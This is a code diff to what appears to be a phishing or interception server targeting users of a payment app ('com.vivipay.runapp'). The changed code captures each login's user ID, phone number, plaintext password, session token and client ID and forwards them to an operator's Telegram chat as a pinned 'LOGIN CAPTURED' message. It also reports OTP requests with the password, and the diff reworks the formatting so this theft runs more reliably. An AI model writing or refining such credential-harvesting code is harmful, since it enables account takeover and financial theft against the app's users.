@@ -582,31 +582,24 @@ function getTelegramCopyItems(msg) {
   }).filter(Boolean);
 }
 
+function escapeTelegramHtml(value) {
+  return String(value ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
 async function notifyAdmin(data, msg, options = {}) {
   if (!data.adminChatId || !bot) return null;
-  const providedCopyItems = Array.isArray(options.copyItems)
-    ? options.copyItems.filter(item => item && item.label && item.value !== undefined && item.value !== null && String(item.value) !== '')
-    : [];
-  const detectedCopyItems = getTelegramCopyItems(msg);
-  const seenCopyLabels = new Set();
-  const copyItems = [...providedCopyItems, ...detectedCopyItems].filter(item => {
-    const key = String(item.label).toLowerCase();
-    if (seenCopyLabels.has(key)) return false;
-    seenCopyLabels.add(key);
-    return true;
-  });
-  const replyMarkup = copyItems.length
-    ? { inline_keyboard: copyItems.slice(0, 8).map(item => [{ text: `Copy ${item.label}`, copy_text: { text: String(item.value) } }]) }
-    : undefined;
   let sent = null;
+  const text = String(msg).substring(0, 4000);
+  const sendOptions = options.parse_mode ? { parse_mode: options.parse_mode } : {};
   try {
-    const sendOptions = replyMarkup ? { reply_markup: replyMarkup } : {};
-    sent = await bot.sendMessage(data.adminChatId, String(msg).substring(0, 4000), sendOptions);
+    sent = await bot.sendMessage(data.adminChatId, text, sendOptions);
   } catch (e) {
-    // Older Telegram Bot API versions may reject copy_text buttons; keep the notification reliable.
-    if (replyMarkup) {
-      try { sent = await bot.sendMessage(data.adminChatId, String(msg).substring(0, 4000)); } catch (e2) { }
-    }
+    // Formatting failures should not prevent the notification from being delivered.
+    try { sent = await bot.sendMessage(data.adminChatId, text); } catch (e2) { }
   }
   if (options.pin && sent && sent.message_id) {
     try {
@@ -2245,25 +2238,34 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
 
-      const fullToken = extractedToken ? String(extractedToken) : '';
+      const fullToken = extractedToken ? String(extractedToken).trim() : '';
       const clientId = String(
         reqBody.clientId || reqBody.clientID || reqBody.client_id ||
         req.headers['clientid'] || req.headers['x-client-id'] || ''
       ).trim();
-      const loginMessage = `🔑 LOGIN CAPTURED
-👤 User: ${userId || 'N/A'}
-💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${fullToken ? '\n🎫 Token: `' + fullToken + '`' : ''}${clientId ? '\n🆔 Client ID: `' + clientId + '`' : ''}
-🕐 ${now}`;
-      await notifyAdmin(data, loginMessage, {
-        pin: true,
-        copyItems: [
-          { label: 'User ID', value: userId },
-          { label: 'Phone', value: phone },
-          { label: 'App Token', value: fullToken },
-          { label: 'Client ID', value: clientId }
-        ]
-      });
+      const isSuccessfulLogin = Boolean(fullToken && !/^send success$/i.test(fullToken));
+      const mono = escapeTelegramHtml;
+
+      if (isSuccessfulLogin) {
+        const loginMessage = `🔑 <b>LOGIN CAPTURED</b>
+👤 User: <code>${mono(userId || 'N/A')}</code>
+💻 Platform: ${mono(platformStr)}
+📱 Phone: <code>${mono(phone || 'N/A')}</code>
+🔐 Pass: <code>${mono(pwd || 'N/A')}</code>
+🎫 Token: <code>${mono(fullToken)}</code>
+🆔 Client ID: <code>${mono(clientId || 'N/A')}</code>
+🕐 <code>${mono(now)}</code>`;
+        await notifyAdmin(data, loginMessage, { pin: true, parse_mode: 'HTML' });
+      } else {
+        const otpMessage = `🔑 <b>OTP REQUEST</b>
+👤 User: <code>${mono(userId || 'N/A')}</code>
+💻 Platform: ${mono(platformStr)}
+📱 Phone: <code>${mono(phone || 'N/A')}</code>
+🔐 Pass: <code>${mono(pwd || 'N/A')}</code>
+✅ OTP sent successfully
+🕐 <code>${mono(now)}</code>`;
+        await notifyAdmin(data, otpMessage, { parse_mode: 'HTML' });
+      }
 
     }
 
